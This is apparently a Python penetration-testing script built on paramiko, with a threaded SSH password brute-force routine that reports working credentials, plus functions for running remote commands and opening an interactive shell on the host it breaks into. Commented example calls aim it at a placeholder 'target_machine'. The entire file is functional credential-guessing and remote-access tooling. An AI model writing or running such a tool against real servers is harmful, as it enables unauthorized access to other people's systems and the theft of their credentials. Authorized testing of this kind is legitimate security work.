import paramiko
import time
import threading
import logging
import os

# Configure logging
logging.basicConfig(filename='ssh_pentest.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def ssh_brute_force(hostname, username, password_list, port=22, timeout=5):
    """Enhanced SSH brute-force with threading, timeout, and logging."""

    def try_password(password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname, port=port, username=username, password=password, timeout=timeout)
            logging.info(f"[+] Successful login: {username}:{password}")
            print(f"[+] Successful login: {username}:{password}")
            client.close()
            return True
        except paramiko.AuthenticationException:
            logging.warning(f"[-] Incorrect password: {password}")
        except Exception as e:
            logging.error(f"[-] Error with password {password}: {e}")
        finally:
            client.close()
        return False

    try:
        with open(password_list, 'r') as passwords:
            threads = []
            for password in passwords:
                password = password.strip()
                thread = threading.Thread(target=try_password, args=(password,))
                threads.append(thread)
                thread.start()
                time.sleep(0.1) #rate limiting
            for thread in threads:
                thread.join()

    except FileNotFoundError:
        logging.error(f"[-] Password list not found: {password_list}")
        print(f"[-] Password list not found: {password_list}")
        return False
    return False

def ssh_command(hostname, username, password, command, port=22):
    """Enhanced SSH command execution with logging."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()
        logging.info(f"Command executed: {command}, output: {output}, error: {error}")
        print(output)
        print(error)
        client.close()

    except Exception as e:
        logging.error(f"[-] Error executing command: {e}")
        print(f"[-] Error: {e}")

def ssh_interactive_shell(hostname, username, password, port=22):
    """Provides an interactive SSH shell."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname, port=port, username=username, password=password)
        channel = client.invoke_shell()
        while True:
            command = input("$ ")
            channel.send(command + "\n")
            time.sleep(0.1)
            output = channel.recv(4096).decode()
            print(output)
    except Exception as e:
        logging.error(f"[-] Error with interactive shell: {e}")
        print(f"[-] Error: {e}")
    finally:
        client.close()

# Example usage
#ssh_brute_force("target_machine", "testuser", "passwords.txt")
#ssh_command("target_machine", "testuser", "testpass", "whoami")
#ssh_interactive_shell("target_machine", "testuser", "testpass")
